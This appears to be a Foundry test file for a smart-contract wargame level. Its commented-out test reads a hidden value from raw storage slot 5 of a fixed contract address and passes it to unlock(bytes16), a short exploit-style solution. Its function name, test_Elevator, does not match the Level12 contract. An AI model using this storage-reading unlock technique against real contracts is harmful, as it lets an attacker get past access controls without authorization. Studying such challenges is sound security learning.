// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract Level12Test is Test {
    address addr = 0x9C04cf47d1EDAa691e16C5f06F82073B8Fe8A8c5;

    function setUp() public {}

    // function test_Elevator() public {
    //     bytes32 a = vm.load(addr, bytes32(uint256(5)));
    //     bytes16 b = bytes16(a);
    //     (bool d,) = address(addr).call(abi.encodeWithSignature("unlock(bytes16)", b));
    //     assertTrue(d);
    // }
}
